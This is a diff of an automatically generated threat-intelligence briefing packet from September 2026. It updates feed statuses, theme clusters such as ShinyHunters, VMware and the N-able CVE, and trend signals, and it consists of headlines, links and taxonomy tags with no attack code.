@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-09-08T05:53:11.347925+00:00
+- Generated: 2026-09-08T11:00:59.874070+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 75
-- Total items in window: 400
-- Total clusters raw: 199
-- Total clusters in packet: 80
-- Dropped low score: 119
+- Total items in window: 397
+- Total clusters raw: 200
+- Total clusters in packet: 79
+- Dropped low score: 121
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -70,20 +70,15 @@
 
 ## Feed status
 
-- **CrowdStrike** (threat_research_primary)
-  - URL: https://www.crowdstrike.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Unit 42** (threat_research_primary)
   - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **Trend Micro Research** (threat_research_primary)
-  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
+- **CrowdStrike** (threat_research_primary)
+  - URL: https://www.crowdstrike.com/blog/feed/
   - Status: ok
-  - Item count: 25
+  - Item count: 10
   - In window count: 0
 - **SentinelOne Labs** (threat_research_primary)
   - URL: https://www.sentinelone.com/labs/feed/
@@ -95,16 +90,21 @@
   - Status: ok
   - Item count: 10
   - In window count: 5
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+- **Trend Micro Research** (threat_research_primary)
+  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
-  - Item count: 10
-  - In window count: 3
+  - Item count: 25
+  - In window count: 0
 - **Google Threat Analysis Group** (threat_research_primary)
   - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 3
 - **Sekoia** (threat_research_primary)
   - URL: https://blog.sekoia.io/feed/
   - Status: parse_error
@@ -114,7 +114,12 @@
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 2
+  - In window count: 1
+- **Citizen Lab** (threat_research_primary)
+  - URL: https://citizenlab.ca/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **NCSC UK** (government_authoritative)
   - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
@@ -125,11 +130,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 8
-- **Citizen Lab** (threat_research_primary)
-  - URL: https://citizenlab.ca/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Check Point Research** (threat_research_primary)
   - URL: https://research.checkpoint.com/feed/
   - Status: ok
@@ -145,23 +145,18 @@
   - Status: ok
   - Item count: 50
   - In window count: 2
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - URL: https://horizon3.ai/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 6
 - **Cisco Talos** (threat_research_primary)
   - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
   - Item count: 15
   - In window count: 1
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 0
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
+  - In window count: 5
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -170,15 +165,20 @@
   - Status: ok
   - Item count: 78
   - In window count: 0
-- **PortSwigger Research** (offensive_vulnerability_research)
-  - URL: https://portswigger.net/research/rss
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
   - Status: ok
-  - Item count: 40
+  - Item count: 10
   - In window count: 0
 - **Red Canary** (detection_response_operations)
   - URL: https://redcanary.com/feed/
   - Status: ok
   - Item count: 10
+  - In window count: 0
+- **PortSwigger Research** (offensive_vulnerability_research)
+  - URL: https://portswigger.net/research/rss
+  - Status: ok
+  - Item count: 40
   - In window count: 0
 - **Exploit-DB** (offensive_vulnerability_research)
   - URL: https://www.exploit-db.com/rss.xml
@@ -204,7 +204,7 @@
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
   - Item count: 10
-  - In window count: 1
+  - In window count: 2
 - **TrustedSec** (detection_response_operations)
   - URL: https://www.trustedsec.com/feed/
   - Status: ok
@@ -220,15 +220,15 @@
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
-  - Status: ok
-  - Item count: 30
-  - In window count: 0
 - **SpecterOps** (detection_response_operations)
   - URL: https://medium.com/feed/specter-ops-posts
   - Status: ok
   - Item count: 10
+  - In window count: 0
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
   - In window count: 0
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
@@ -250,28 +250,23 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Sysdig** (detection_response_operations)
-  - URL: https://sysdig.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 2
-- **Rapid7** (offensive_vulnerability_research)
-  - URL: https://www.rapid7.com/blog/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
   - Item count: 20
   - In window count: 1
+- **Rapid7** (offensive_vulnerability_research)
+  - URL: https://www.rapid7.com/blog/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 2
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
+- **Sysdig** (detection_response_operations)
+  - URL: https://sysdig.com/feed/
   - Status: ok
   - Item count: 100
   - In window count: 2
@@ -285,96 +280,96 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Cloudflare Radar** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
   - Item count: 20
+  - In window count: 0
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
   - In window count: 0
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 4
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **OpenSSF Blog** (ai_security_agentic_risk)
   - URL: https://openssf.org/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - URL: https://cloudblog.withgoogle.com/rss/
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
-  - Item count: 20
-  - In window count: 13
+  - Item count: 10
+  - In window count: 2
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
-  - Status: ok
-  - Item count: 5
-  - In window count: 5
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - URL: https://www.bleepingcomputer.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 15
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - URL: https://www.securityweek.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **GreyNoise** (cloud_identity_infrastructure)
-  - URL: https://www.greynoise.io/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Simon Willison** (ai_security_agentic_risk)
   - URL: https://simonwillison.net/atom/everything/
   - Status: ok
   - Item count: 30
   - In window count: 27
-- **Elastic Security Labs** (detection_response_operations)
-  - URL: https://www.elastic.co/security-labs/rss/feed.xml
+- **GreyNoise** (cloud_identity_infrastructure)
+  - URL: https://www.greynoise.io/blog/rss.xml
   - Status: ok
   - Item count: 100
-  - In window count: 1
+  - In window count: 0
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - URL: https://cloudblog.withgoogle.com/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 13
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - URL: https://www.bleepingcomputer.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 15
 - **AI Snake Oil** (ai_security_agentic_risk)
   - URL: https://www.aisnakeoil.com/feed
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Help Net Security** (cyber_news_breach_reporting)
-  - URL: https://www.helpnetsecurity.com/feed/
+- **Elastic Security Labs** (detection_response_operations)
+  - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
-  - Item count: 10
-  - In window count: 10
+  - Item count: 100
+  - In window count: 1
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
   - In window count: 20
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - URL: https://www.team-cymru.com/post/rss.xml
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - URL: https://www.securityweek.com/feed/
   - Status: ok
-  - Item count: 100
-  - In window count: 100
+  - Item count: 10
+  - In window count: 10
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
+  - Status: ok
+  - Item count: 5
+  - In window count: 5
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **Help Net Security** (cyber_news_breach_reporting)
+  - URL: https://www.helpnetsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **Schneier on Security** (practitioner_analysis)
   - URL: https://www.schneier.com/feed/atom/
   - Status: ok
@@ -385,10 +380,10 @@
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
   - Status: ok
-  - Item count: 10
+  - Item count: 100
   - In window count: 1
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
@@ -400,13 +395,18 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 3
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
-- **Reddit r/msp** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/msp/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -415,26 +415,26 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/AskNetsec** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/AskNetsec/.rss
+- **Reddit r/msp** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/msp/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
-  - Item count: 20
-  - In window count: 3
+  - Item count: 100
+  - In window count: 100
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
   - Item count: 100
   - In window count: 24
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
+- **Reddit r/AskNetsec** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
-  - Item count: 100
-  - In window count: 1
+  - Item count: 0
+  - In window count: 0
 - **The Hacker News** (cyber_news_breach_reporting)
   - URL: https://feeds.feedburner.com/TheHackersNews
   - Status: ok
@@ -444,16 +444,16 @@
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
   - Item count: 25
-  - In window count: 11
-- **tl;dr sec** (practitioner_analysis)
-  - URL: https://tldrsec.com/feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
+  - In window count: 10
 - **Embrace the Red** (ai_security_agentic_risk)
   - URL: https://embracethered.com/blog/index.xml
   - Status: ok
   - Item count: 100
+  - In window count: 0
+- **tl;dr sec** (practitioner_analysis)
+  - URL: https://tldrsec.com/feed.xml
+  - Status: ok
+  - Item count: 20
   - In window count: 0
 - **Risky Business News** (practitioner_analysis)
   - URL: https://risky.biz/feeds/risky-business-news/
@@ -473,29 +473,49 @@
 
 ## Affinity groups (themes)
 
-### ShinyHunters targeting Salesforce
+### ShinyHunters: ransomware extortion
 - Anchor signal: ShinyHunters
 - Theme key: shinyhunters
-- Cluster count: 5
+- Cluster count: 6
 - Article count: 7
-- Cohesion: 0.385
+- Cohesion: 0.339
 - Shared strong signals: ShinyHunters
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
   - threat_categories: ransomware_extortion, apt_espionage
   - actor_attribution: ShinyHunters, Cl0p
-  - affected_industries: manufacturing_industrial
-  - affected_products: Salesforce
-- Cluster IDs: d8c893e316, 498d32f5a8, 0be1df44fd, 88364fe6d8, e91d731094
+- Cluster IDs: d8c893e316, 498d32f5a8, 0be1df44fd, 88364fe6d8, 1b8c4b752b, e91d731094
 - Links:
   - https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
-  - https://www.infosecurity-magazine.com/news/healthcare-mckesson-investigates/
   - https://www.darkreading.com/cybersecurity-operations/what-we-missed-did-shinyhunters-breach-reliaquest
   - https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
   - https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
   - https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
+  - https://www.securityweek.com/mathspace-data-breach-exposes-over-1-million-people/
   - https://www.bleepingcomputer.com/news/security/mathspace-discloses-data-breach-affecting-over-1-million-people/
+
+### VMware active exploitation
+- Anchor signal: VMware
+- Theme key: vmware
+- Cluster count: 5
+- Article count: 5
+- Cohesion: 0.269
+- Shared strong signals: VMware
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: zero_day, web_shell_backdoor, active_exploitation, supply_chain, phishing_social_eng
+  - affected_industries: government, education
+  - affected_products: VMware, OpenAI/ChatGPT, AWS, WordPress
+  - urgency_signals: zero_day, actively_exploited, preauth_unauth, no_patch_yet
+- Cluster IDs: fe03764b75, 81b3bf0ce0, 1b8c4b752b, 8d0dc94b54, 9f4e218d51
+- Links:
+  - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
+  - https://thehackernews.com/2026/09/adobe-patches-magento-zero-day.html
+  - https://www.securityweek.com/mathspace-data-breach-exposes-over-1-million-people/
+  - https://www.securityweek.com/n-able-patches-critical-zero-day-in-n-central/
+  - https://thehackernews.com/2026/09/pegasus-zero-click-spyware-exploit.html
 
 ### SonicWall active exploitation
 - Anchor signal: SonicWall
@@ -522,6 +542,52 @@
   - https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/
   - https://www.darkreading.com/vulnerabilities-threats/critical-langflow-flaw-exploited-attacks-rise
 
+### AWS active exploitation
+- Anchor signal: AWS
+- Theme key: aws
+- Cluster count: 4
+- Article count: 8
+- Cohesion: 0.283
+- Shared strong signals: AWS
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: supply_chain, zero_day, web_shell_backdoor, active_exploitation, phishing_social_eng
+  - affected_industries: government, education
+  - affected_products: AWS, VMware, OpenAI/ChatGPT
+  - urgency_signals: preauth_unauth, no_patch_yet, actively_exploited, zero_day
+- Cluster IDs: fe03764b75, 81b3bf0ce0, 9d718427a9, 9f4e218d51
+- Links:
+  - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
+  - https://thehackernews.com/2026/09/adobe-patches-magento-zero-day.html
+  - https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
+  - https://orca.security/resources/blog/orca-security-browser-extension-aws-console/
+  - https://aws.amazon.com/blogs/security/incident-response-guide-for-aws-cloudtrail-investigations-part-2/
+  - https://thehackernews.com/2026/09/pegasus-zero-click-spyware-exploit.html
+
+### WordPress active exploitation
+- Anchor signal: WordPress
+- Theme key: wordpress
+- Cluster count: 5
+- Article count: 6
+- Cohesion: 0.211
+- Shared strong signals: WordPress
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: active_exploitation, web_shell_backdoor, apt_espionage, ransomware_extortion, zero_day
+  - affected_industries: government
+  - affected_products: WordPress, OpenAI/ChatGPT, VMware
+  - urgency_signals: actively_exploited, preauth_unauth, no_patch_yet, zero_day
+- Cluster IDs: 6a5c697136, 9ebfca707c, d19603372e, 1b8c4b752b, 8d0dc94b54
+- Links:
+  - https://www.bleepingcomputer.com/news/security/hackers-target-critical-citrix-netscaler-auth-bypass-in-attacks/
+  - https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
+  - https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/
+  - https://www.darkreading.com/cyberattacks-data-breaches/old-unpatched-flaws-attackers-philippines-nuclear-agency
+  - https://www.securityweek.com/mathspace-data-breach-exposes-over-1-million-people/
+  - https://www.securityweek.com/n-able-patches-critical-zero-day-in-n-central/
+
 ### Cl0p: ransomware extortion
 - Anchor signal: Cl0p
 - Theme key: cl0p
@@ -542,33 +608,31 @@
   - https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january
   - https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
 
-### AWS active exploitation
-- Anchor signal: AWS
-- Theme key: aws
+### CVE-2026-86218 exploitation activity
+- Anchor signal: CVE-2026-86218
+- Theme key: cve-2026-86218
 - Cluster count: 3
-- Article count: 7
-- Cohesion: 0.243
-- Shared strong signals: AWS
+- Article count: 4
+- Cohesion: 0.394
+- Shared strong signals: CVE-2026-86218
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: supply_chain, zero_day, web_shell_backdoor, active_exploitation
-  - affected_industries: government
-  - affected_products: AWS, VMware
-  - urgency_signals: preauth_unauth, no_patch_yet, actively_exploited, zero_day
-- Cluster IDs: fe03764b75, 9d718427a9, 9f4e218d51
+  - threat_categories: zero_day, active_exploitation
+  - cve_ids: CVE-2026-86218, CVE-2026-86206, CVE-2026-86207
+  - urgency_signals: actively_exploited, zero_day, no_patch_yet, preauth_unauth
+- Cluster IDs: 57f867835f, 81949698a6, 8d0dc94b54
 - Links:
-  - https://thehackernews.com/2026/09/google-releases-chrome-update-to-patch.html
-  - https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
-  - https://orca.security/resources/blog/orca-security-browser-extension-aws-console/
-  - https://aws.amazon.com/blogs/security/incident-response-guide-for-aws-cloudtrail-investigations-part-2/
-  - https://thehackernews.com/2026/09/pegasus-zero-click-spyware-exploit.html
+  - https://www.helpnetsecurity.com/2026/09/07/n-able-n-central-hotfix-cve-2026-86218/
+  - https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
+  - https://thehackernews.com/2026/09/n-able-issues-fourth-n-central-hotfix.html
+  - https://www.securityweek.com/n-able-patches-critical-zero-day-in-n-central/
 
 ### ransomware extortion targeting Microsoft SharePoint
 - Anchor signal: Microsoft SharePoint
 - Theme key: microsoft-sharepoint
 - Cluster count: 3
-- Article count: 5
+- Article count: 4
 - Cohesion: 0.2
 - Shared strong signals: Microsoft SharePoint
 - Member CVEs: (none)
@@ -582,46 +646,7 @@
   - https://www.bleepingcomputer.com/news/security/hackers-target-critical-citrix-netscaler-auth-bypass-in-attacks/
   - https://www.team-cymru.com/post/toolshell-sharepoint-and-the-death-of-the-patch-window
   - https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
-  - https://www.infosecurity-magazine.com/news/healthcare-mckesson-investigates/
   - https://www.darkreading.com/cybersecurity-operations/what-we-missed-did-shinyhunters-breach-reliaquest
-
-### CVE-2026-86218 exploitation activity
-- Anchor signal: CVE-2026-86218
-- Theme key: cve-2026-86218
-- Cluster count: 2
-- Article count: 3
-- Cohesion: 0.386
-- Shared strong signals: CVE-2026-86218
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: zero_day, active_exploitation
-  - cve_ids: CVE-2026-86218
-  - urgency_signals: actively_exploited, zero_day
-- Cluster IDs: 57f867835f, 81949698a6
-- Links:
-  - https://www.helpnetsecurity.com/2026/09/07/n-able-n-central-hotfix-cve-2026-86218/
-  - https://www.infosecurity-magazine.com/news/nable-hotfix-critical-rce/
-  - https://thehackernews.com/2026/09/n-able-issues-fourth-n-central-hotfix.html
-
-### WordPress vulnerability activity
-- Anchor signal: WordPress
-- Theme key: wordpress
-- Cluster count: 3
-- Article count: 4
-- Cohesion: 0.2
-- Shared strong signals: WordPress
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - affected_industries: government
-  - affected_products: WordPress
-- Cluster IDs: 6a5c697136, 9ebfca707c, d19603372e
-- Links:
-  - https://www.bleepingcomputer.com/news/security/hackers-target-critical-citrix-netscaler-auth-bypass-in-attacks/
-  - https://thehackernews.com/2026/09/over-440000-exploit-attempts-target.html
-  - https://www.securityweek.com/elementor-pro-wordpress-plugin-vulnerability-exploited-to-hack-sites/
-  - https://www.darkreading.com/cyberattacks-data-breaches/old-unpatched-flaws-attackers-philippines-nuclear-agency
 
 ### phishing social eng targeting Microsoft Defender
 - Anchor signal: Microsoft Defender
@@ -641,29 +666,29 @@
   - https://thehackernews.com/2026/09/fake-software-installers-disable.html
   - https://www.microsoft.com/en-us/security/blog/2026/09/03/ascii-smuggling-crosses-over-from-ai-prompt-injection-to-phishing-evasion/
 
-### Rhysida: ransomware extortion
-- Anchor signal: Rhysida
-- Theme key: rhysida
+### ransomware extortion targeting Snowflake
+- Anchor signal: Snowflake
+- Theme key: snowflake
 - Cluster count: 2
 - Article count: 2
-- Cohesion: 0.316
-- Shared strong signals: Rhysida
+- Cohesion: 0.3
+- Shared strong signals: Snowflake
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: ransomware_extortion
-  - actor_attribution: Rhysida
-  - affected_industries: government
-- Cluster IDs: b579a537a6, 3e2126d697
+  - threat_categories: ransomware_extortion, zero_day
+  - affected_products: Snowflake
+  - urgency_signals: zero_day
+- Cluster IDs: b579a537a6, e91d731094
 - Links:
   - https://www.infosecurity-magazine.com/news/rhysida-berlin-data-extortion/
-  - https://therecord.media/germany-berlin-second-data-breach-city-agencies
+  - https://www.bleepingcomputer.com/news/security/mathspace-discloses-data-breach-affecting-over-1-million-people/
 
 ### phishing social eng targeting Microsoft 365
 - Anchor signal: Microsoft 365
 - Theme key: microsoft-365
 - Cluster count: 2
-- Article count: 4
+- Article count: 5
 - Cohesion: 0.318
 - Shared strong signals: Microsoft 365
 - Member CVEs: (none)
@@ -675,6 +700,7 @@
 - Links:
   - https://www.microsoft.com/en-us/security/blog/2026/09/03/ascii-smuggling-crosses-over-from-ai-prompt-injection-to-phishing-evasion/
   - https://thehackernews.com/2026/09/microsoft-365-attackers-use-help-desk.html
+  - https://www.infosecurity-magazine.com/news/bigbear-2-phaas-5000-microsoft/
   - https://www.bleepingcomputer.com/news/security/bigbear-microsoft-365-phishing-service-bypassed-mfa-at-258-organizations/
 
 ### CVE-2026-82329 exploitation activity
@@ -696,36 +722,15 @@
   - https://www.darkreading.com/application-security/attackers-pounce-critical-artifactory-flaw-disclosure
   - https://thehackernews.com/2026/09/attackers-exploit-critical-jfrog.html
 
-### Scattered Spider: ransomware extortion
-- Anchor signal: Scattered Spider
-- Theme key: scattered-spider
-- Cluster count: 2
-- Article count: 2
-- Cohesion: 0.2
-- Shared strong signals: Scattered Spider
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: ransomware_extortion
-  - actor_attribution: Scattered Spider
-- Cluster IDs: b579a537a6, fc5c9992d3
-- Links:
-  - https://www.infosecurity-magazine.com/news/rhysida-berlin-data-extortion/
-  - https://www.team-cymru.com/post/scattered-spider-attacks-infrastructure-profile
-
 ## Forward signals
 
 ### Novelty
-- Novel cves: 0
+- Novel cves: 1
+  - CVE-2026-75650 (first seen via The Hacker News at 2026-09-08T09:13:47+00:00, cluster 81b3bf0ce0)
 - Novel actors: 0
 - Novel products: 0
 
-### Velocity bursts (1)
-- **Financially Motivated Threat Actor BREEZE COMET Targets Brazil**
-  - Cluster: 25cdc2e4b7
-  - Sources in window: 3
-  - Window hours: 3.3
-  - Cohort count: 3
+### Velocity bursts (0)
 
 ### Leading edge (1)
 - **How Virginia Tech Connected Pentesting to Its Engineering Workflow**
@@ -758,11 +763,11 @@
   - New products: Microsoft SharePoint
   - Prior top industries: education, financial_services, healthcare
   - Prior top products: Anthropic/Claude, Microsoft Entra, Salesforce
-- **UNC6240** (cluster d8c893e316)
-  - New industries: healthcare
-  - New products: (none)
-  - Prior top industries: education, financial_services, telecommunications
-  - Prior top products: AWS, Microsoft SharePoint, Salesforce
+- **Lazarus** (cluster b579a537a6)
+  - New industries: healthcare, legal_professional
+  - New products: Snowflake
+  - Prior top industries: aviation_defense, financial_services, government
+  - Prior top products: Android, Microsoft Windows, OpenAI/ChatGPT
 - **Rhysida** (cluster b579a537a6)
   - New industries: healthcare, legal_professional
   - New products: Snowflake
@@ -787,6 +792,7 @@
 - cve_ids: CVE-2025-3248 (weeks observed: 6, cluster 8370077906)
 - cve_ids: CVE-2026-18556 (weeks observed: 5, cluster 81949698a6)
 - cve_ids: CVE-2026-18577 (weeks observed: 5, cluster 81949698a6)
+- actor_attribution: Lazarus (weeks observed: 5, cluster b579a537a6)
 - actor_attribution: BlackCat/ALPHV (weeks observed: 5, cluster fc5c9992d3)
 - cve_ids: CVE-2026-19490 (weeks observed: 4, cluster 6a5c697136)
 - actor_attribution: Volt Typhoon (weeks observed: 4, cluster b9771fe2d2)
@@ -794,7 +800,6 @@
 - actor_attribution: Kimsuky (weeks observed: 4, cluster 93a2320bbc)
 - actor_attribution: RansomHub (weeks observed: 4, cluster fc5c9992d3)
 - cve_ids: CVE-2026-3055 (weeks observed: 3, cluster 6a5c697136)
-- cve_ids: CVE-2024-36401 (weeks observed: 3, cluster 5f380a65c5)
 
 ### Tier inversion (1)
 - **Researchers Use Claude to Port Pre-Auth RCE Exploit From One PLC Model to Another**
@@ -877,27 +882,29 @@ Back to Blog Vulnerabilities and Exploits Critical SonicWall SMA1000 Vulnerabili
   - Link: https://www.sophos.com/en-us/blog/sonicwall-83548-83549
   - Summary: Categories: Threat Research Tags: advisory, vulnerability, SonicWall
 
-### Cluster 877d4c3772 — score 59
+### Cluster 18b9943c52 — score 54
 
-- Title: Off the Hook: Discovering and Observing Active Exploitation of Sangoma Switchvox CVE-2026-9586
+- Title: CVE-2026-9586 | Sangoma Switchvox Unauthenticated SQL Injection Remote Code Execution Vulnerability
 - Source: Horizon3 Attack Research (offensive_vulnerability_research)
-- Published: 2026-09-01T10:01:00+00:00
-- Link: https://horizon3.ai/attack-research/disclosures/cve-2026-9586-sangoma-switchvox-rce/
+- Published: 2026-09-01T15:32:54+00:00
+- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-9586/
 - Fetch status: ok
-- Member count: 5
-- Corroborating source count: 4
+- Member count: 3
+- Corroborating source count: 3
 - Strong signals: CVE-2026-9586
 
 #### Cluster taxonomy (union across members)
 - threat_categories: active_exploitation
-- cve_ids: CVE-2025-57819, CVE-2025-64328, CVE-2026-9586
+- affected_industries: critical_infrastructure
+- cve_ids: CVE-2026-9586
 - urgency_signals: actively_exploited, preauth_unauth
 - content_type: news_report, vulnerability_disclosure
 - confidence_tier: tier_1_offensive_research, tier_4_news, tier_5_chatter
 
 #### Primary article taxonomy
 - threat_categories: active_exploitation
-- cve_ids: CVE-2026-9586, CVE-2025-57819, CVE-2025-64328
+- affected_industries: critical_infrastructure
+- cve_ids: CVE-2026-9586
 - urgency_signals: actively_exploited, preauth_unauth
 - content_type: vulnerability_disclosure
